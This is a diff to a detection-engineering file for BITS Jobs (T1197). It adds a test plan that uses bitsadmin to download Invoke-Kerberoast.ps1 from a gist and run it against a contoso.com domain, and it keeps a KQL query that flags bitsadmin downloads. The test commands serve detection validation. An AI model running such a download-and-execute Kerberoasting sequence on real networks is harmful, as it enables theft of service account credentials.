@@ -4,6 +4,15 @@ Description: BitsAdmin is a built-in Windows tool that can used to download arbi
 
 Table: DeviceProcessEvents
 
+Test plan:
+
+bitsadmin /transfer "DownloadFile" https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1
+C:\Temp\Invoke-Kerberoast.ps1
+
+cd C:\Temp
+Invoke-Kerberoast.ps1 -Domain contoso.com | fl
+
+
 KQL Query:
 
 // T1197 - BITS Jobs
@@ -13,5 +22,3 @@ DeviceProcessEvents
 | where FolderPath == "C:\\Windows\\System32\\bitsadmin.exe" and ProcessCommandLine contains "http"
 | project Timestamp, DeviceName, FolderPath, ProcessCommandLine, AccountDomain, AccountName, InitiatingProcessFolderPath, ProcessCreationTime
 | sort by Timestamp desc
-
-
